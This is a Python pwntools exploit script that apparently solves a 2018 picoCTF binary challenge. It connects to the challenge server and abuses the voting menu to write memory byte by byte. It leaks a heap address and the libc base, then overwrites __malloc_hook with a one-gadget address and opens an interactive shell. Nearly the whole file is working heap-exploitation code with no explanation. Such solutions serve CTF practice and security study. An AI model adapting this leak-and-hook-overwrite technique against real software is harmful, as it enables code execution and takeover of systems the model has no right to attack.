from pwn import *

def nominate(payload):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Vote for\n> ', payload)

def choose(payload):
    r.sendlineafter('> ', '2')
    r.sendlineafter('(y/n) ', 'y')
    r.sendlineafter('vote for?\n> ', payload)

def choosechoose(payload):
    print("hello")
    r.sendlineafter('> ', '2')
    r.sendlineafter('(y/n) ', 'n')
    r.sendlineafter('vote for?\n> ', "choose")
    #r.interactive()
    r.sendafter('instead?\n> ',"y\n" + "A"*(6 + 24) + payload)


def view():
	pass

libc = ELF('./libc.so.6')
#r = process("./no-args")

r = remote("2018shell1.picoctf.com", 25422)
nominate(p64(0xffffffffff5fffff) + p64(0x6021c0))
nominate("B"*8 + p64(0x602028) + "B"*15)

choosechoose(p64(0x6021c0 - 0x10) + p64(0x11)[:-1])
choosechoose(p64(0x6021c1 - 0x10) + p64(0x11)[:-1])
choosechoose(p64(0x6021c2 - 0x10) + p64(0x40)[:-1])

choosechoose(p64(0x6021c8 - 0x10) + p64(0x60)[:-1])
choosechoose(p64(0x6021c8 - 0x10) + p64(0x70)[:-1])
choosechoose(p64(0x6021c9 - 0x10) + p64(0x21)[:-1])
choosechoose(p64(0x6021ca - 0x10) + p64(0x60)[:-1])

#gdb.attach(r)
#401330
choosechoose(p64(0x6021d0 - 0x10) + p64(0x58)[:-1])
choosechoose(p64(0x6021d0 - 0x10) + p64(0x30)[:-1])
choosechoose(p64(0x6021d1 - 0x10) + p64(0x1f)[:-1])
choosechoose(p64(0x6021d2 - 0x10) + p64(0x60)[:-1])

for i in range(0x20):
    choosechoose("")


r.sendlineafter("> ", "2")
r.sendlineafter('(y/n) ', 'y')
r.recvuntil("5  - ")
got = r.recvuntil("\n6")[:-2]
heap_leak = u64(got + "\x00"*(8-len(got)))
log.info("heap leak: 0x{:x}".format(heap_leak))
r.sendline("")
# fix vsys address
choosechoose(p64(heap_leak + 0xc0 - 0x10) + p64(0x1))
# change to new heap
choosechoose(p64(0x602028 - 0x10) + p64(0xe0))

#r.interactive()
# leak libc
r.sendlineafter("> ", "2")
r.sendlineafter('(y/n) ', 'y')
r.recvuntil("2  - ")
got = r.recvuntil("\n")[:-1]
leak = u64(got + "\x00"*(8-len(got)))
libc_base = leak - libc.symbols['puts']
log.info("libc base: 0x{:x}".format(libc_base))
r.sendline("")
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("malloc hook: 0x{:x}".format(malloc_hook))
#add rsp + 0x48
#oneshot = libc_base + 0x00000000000c9f81
oneshot = libc_base + 0xf0274
log.info("oneshot: 0x{:x}".format(oneshot))



for i in range(6):
    b = ord(p64(oneshot)[i])
    if b < 0x7f:
        choosechoose(p64(malloc_hook + i - 0x10) + p64(b))
    else:
        b = b - 0x70
        choosechoose(p64(malloc_hook + i - 0x10) + p64(0x70))
        choosechoose(p64(malloc_hook + i - 0x10) + p64(b))

# change state to 0
choosechoose(p64(0x602020 - 0x10) + p64(0xff))

oneshot = libc_base + 0xf0274
r.recvuntil("valid")
r.recvuntil("> ")
r.sendline("1")
#r.interactive()
p = "A"*24 + p64(0)
r.sendline(p)

r.interactive()

